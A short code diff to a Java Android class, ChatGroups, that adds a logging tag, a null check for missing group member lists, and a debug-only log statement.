@@ -8,6 +8,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
 
 public abstract class ChatGroups {
+	private static final String TAG = "ChatGroups";
 
 	final Hashtable<String, List<String>> groups = new Hashtable<String, List<String>>();
 	final Hashtable<String, String> tos = new Hashtable<String, String>();
@@ -19,6 +20,9 @@ public abstract class ChatGroups {
 		}
 
 		List<String> list = groups.get(groupname);
+		if(list==null){
+			return null;
+		}
 		StringBuilder builder = new StringBuilder();
 		for (String p : list) {
 			if (!author.equals(p)) {
@@ -55,6 +59,9 @@ public abstract class ChatGroups {
 	abstract boolean isGroup(String peer);
 
 	public boolean hasMemoizedGroup(String groupName) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (hasMemoizedGroup) : " + groupName + " : " + groups.containsKey(groupName));
+		}
 		return groups.containsKey(groupName);
 	}
 
